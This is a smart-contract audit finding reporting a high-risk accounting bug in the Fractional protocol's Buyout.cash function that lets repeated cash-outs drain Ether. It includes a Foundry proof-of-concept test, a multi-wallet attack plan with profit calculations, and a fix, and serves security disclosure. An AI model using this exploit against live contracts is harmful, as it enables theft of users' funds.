## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Cash-out from a successful buyout allows an attacker to drain Ether from the `Buyout` contract](https://github.com/code-423n4/2022-07-fractional-findings/issues/440) 

# Lines of code

https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269


# Vulnerability details

## Impact

The function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.

However, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.

## Proof of Concept

Copy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:

The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.

```solidity
function testCashDrainEther() public {
  /// ==================
  /// ===== SETUP =====
  /// ==================

  deployBaseVault(alice, TOTAL_SUPPLY);
  (token, tokenId) = registry.vaultToToken(vault);
  alice.ferc1155 = new FERC1155BS(address(0), 111, token);
  bob.ferc1155 = new FERC1155BS(address(0), 222, token);
  eve.ferc1155 = new FERC1155BS(address(0), 333, token);

  buyout = address(buyoutModule);
  proposalPeriod = buyoutModule.PROPOSAL_PERIOD();
  rejectionPeriod = buyoutModule.REJECTION_PERIOD();

  vm.label(vault, "VaultProxy");
  vm.label(token, "Token");

  setApproval(alice, vault, true);
  setApproval(alice, buyout, true);
  setApproval(bob, vault, true);
  setApproval(bob, buyout, true);
  setApproval(eve, vault, true);
  setApproval(eve, buyout, true);

  alice.ferc1155.safeTransferFrom(
      alice.addr,
      bob.addr,
      1,
      6000,
      ""
  );

  alice.ferc1155.safeTransferFrom(
      alice.addr,
      eve.addr,
      1,
      2000,
      ""
  );
  /// ==================
  /// ===== SETUP END =====
  /// ==================

  /// Fraction balances:
  assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000
  assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000
  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000

  bob.buyoutModule.start{value: 10 ether}(vault);

  assertEq(getETHBalance(buyout), 10 ether);

  /// Bob (proposer of buyout) transfered his fractions to buyout contract
  assertEq(getFractionBalance(buyout), 6000);

  vm.warp(rejectionPeriod + 1);

  bob.buyoutModule.end(vault, burnProof);

  /// Fraction balances after buyout ended:
  assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000
  assertEq(getFractionBalance(bob.addr), 0); // Bob: 0
  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000

  assertEq(getETHBalance(buyout), 10 ether);

  /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)
  alice.buyoutModule.cash(vault, burnProof);

  assertEq(getFractionBalance(alice.addr), 0);
  assertEq(getETHBalance(alice.addr), 105 ether);

  /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH
  eve.buyoutModule.cash(vault, burnProof);
}
```

**Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:

1. Attacker deploys a vault with `10.000` fractions minted
2. 51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each)
3. With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether`
4. Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting)
5. After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:
   1. Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)
   2. Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)
   3. Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)
   4. Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)
   5. Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)

If summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.

This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.

## Tools Used

Manual review

## Recommended mitigation steps

Decrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):

```solidity
function cash(address _vault, bytes32[] calldata _burnProof) external {
    // Reverts if address is not a registered vault
    (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(
        _vault
    );
    if (id == 0) revert NotVault(_vault);
    // Reverts if auction state is not successful
    (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);
    State required = State.SUCCESS;
    if (current != required) revert InvalidState(required, current);
    // Reverts if caller has a balance of zero fractional tokens
    uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);
    if (tokenBalance == 0) revert NoFractions();

    // Initializes vault transaction
    bytes memory data = abi.encodeCall(
        ISupply.burn,
        (msg.sender, tokenBalance)
    );
    // Executes burn of fractional tokens from caller
    IVault(payable(_vault)).execute(supply, data, _burnProof);

    // Transfers buyout share amount to caller based on total supply
    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);
    uint256 buyoutShare = (tokenBalance * ethBalance) /
        (totalSupply + tokenBalance);
    buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`
    _sendEthOrWeth(msg.sender, buyoutShare);
    // Emits event for cashing out of buyout pool
    emit Cash(_vault, msg.sender, buyoutShare);
}
```


